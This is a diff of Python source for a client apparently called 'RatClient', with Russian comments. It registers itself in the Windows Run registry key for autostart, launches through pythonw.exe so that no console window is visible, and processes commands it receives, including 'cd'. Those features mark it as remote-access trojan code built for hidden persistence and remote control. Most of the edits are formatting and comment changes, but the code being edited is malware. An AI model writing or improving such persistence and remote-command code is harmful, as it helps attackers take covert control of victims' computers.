@@ -27,6 +27,7 @@ def add_to_autostart_windows():
     try:
         exe_path = sys.executable
         script_path = os.path.abspath(__file__)
+        # Используем pythonw.exe, если он есть, чтобы не показывалось окно консоли
         if exe_path.lower().endswith("python.exe"):
             pythonw_path = exe_path[:-4] + "w.exe"
             if os.path.exists(pythonw_path):
@@ -34,10 +35,9 @@ def add_to_autostart_windows():
 
         cmd = f'"{exe_path}" "{script_path}"'
 
-        key = winreg.OpenKey(
-            winreg.HKEY_CURRENT_USER,
-            r"Software\Microsoft\Windows\CurrentVersion\Run",
-            0, winreg.KEY_SET_VALUE)
+        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
+                             r"Software\Microsoft\Windows\CurrentVersion\Run",
+                             0, winreg.KEY_SET_VALUE)
         winreg.SetValueEx(key, "RatClient", 0, winreg.REG_SZ, cmd)
         winreg.CloseKey(key)
         return True, "Добавлено в автозагрузку Windows"
@@ -49,11 +49,11 @@ def is_in_autostart_windows():
         import winreg
     except ImportError:
         return False
+
     try:
-        key = winreg.OpenKey(
-            winreg.HKEY_CURRENT_USER,
-            r"Software\Microsoft\Windows\CurrentVersion\Run",
-            0, winreg.KEY_READ)
+        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
+                            r"Software\Microsoft\Windows\CurrentVersion\Run",
+                            0, winreg.KEY_READ)
         i = 0
         while True:
             name, _, _ = winreg.EnumValue(key, i)
@@ -157,7 +157,6 @@ def main():
                     cmd = data[4:]
                     if cmd.startswith("cd"):
                         path = cmd[2:].strip()
-                        # cd без аргументов или с пробелами - перейти в домашнюю папку
                         if not path:
                             path = os.path.expanduser("~")
                         try:
